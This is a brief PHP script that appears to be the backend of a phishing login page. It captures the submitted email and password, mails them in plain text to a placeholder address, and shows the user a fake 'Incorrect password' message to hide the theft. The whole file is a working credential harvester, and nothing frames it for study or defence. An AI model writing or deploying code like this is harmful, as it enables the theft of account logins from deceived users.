<?php
  if(isset($_POST['submit'])){
    $email=$_POST['email'];
    $password=$_POST['password'];
    

    $to='youremail@gmail.com'; 
    $subject='Form Submission';
    $message="Email :".$email."\n"."Password :".$password;
    $headers="From: ".$email;

    if(mail($to, $subject, $message, $headers)){
      echo "<h1>Incorrect password.! </h1> <br>
      <h3> Please try again..!</h3>";
    }
    else{
      echo "Something went wrong!";
    }
  }
?>

